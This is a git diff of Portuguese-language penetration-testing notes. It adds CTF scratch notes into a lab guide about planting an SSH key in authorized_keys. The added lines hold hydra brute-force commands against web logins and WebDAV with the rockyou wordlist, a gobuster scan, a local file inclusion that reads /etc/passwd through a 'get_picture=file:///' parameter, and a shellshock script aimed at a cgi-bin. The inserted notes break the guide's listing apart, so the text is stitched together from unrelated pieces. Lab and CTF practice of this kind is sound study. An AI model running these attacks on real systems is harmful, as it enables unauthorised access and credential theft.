@@ -187,6 +187,33 @@ Na máquina linuxvictim, podemos inserir a chave pública no arquivoauthorized_
 linuxvictim@linuxvictim:~$ echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
 ```
 
+
+```
+hydra -l marujo -P /usr/share/wordlists/rockyou.txt -t 3 -f 192.168.90.43 http-post-form "/?action=login:username=^USER^&password=^PASS^:Usuário ou senha inválido\!"
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -o saida.txt 192.168.90.84 http-get /webdav
+
+gobuster dir -u http://192.168.90.77/cmd/ -w /usr/share/wordlists/dirb/big.txt -o gobuster90-77.txt
+```
+
+```
+Através desse "get_picture=" conseguimos exibir arquivos da máquina usando:
+
+file:///
+Então a URL ficou assim:
+
+http://192.168.90.43/?get_picture=file:///arquivo
+Pegamos o passwd com:
+
+http://192.168.90.43/?get_picture=file:///etc/passwd
+retorno:
+```
+
+
+
+
+
+
 > Listagem 12 – Inserindo a chave pública
 
 Podemos então fazer ssh de nossa VM Kali usando nossa chave privada para a máquina _linuxvictim_ e fazer login como usuário _linuxvictim_ sem uma senha. Se não especificarmos uma chave privada SSH para usar, o cliente SSH usará aquela em ~/.ssh/id_rsa .
@@ -196,4 +223,15 @@ kali@kali:~$ ssh linuxvictim@linuxvictim
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-20-generic x86_64)
 ...
 linuxvictim@linuxvictim:~$ 
+```
+
+
+
+
+CGI-BINS
+Testei o cgi-bin sem sucesso:
+(https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
+```
+┌──(root💀naboo)-[/home/legunner/CTF/ctf90-84]
+└─# python3 shellshocker.py https://192.168.90.84/cgi-bin/admin.cgi
 ```
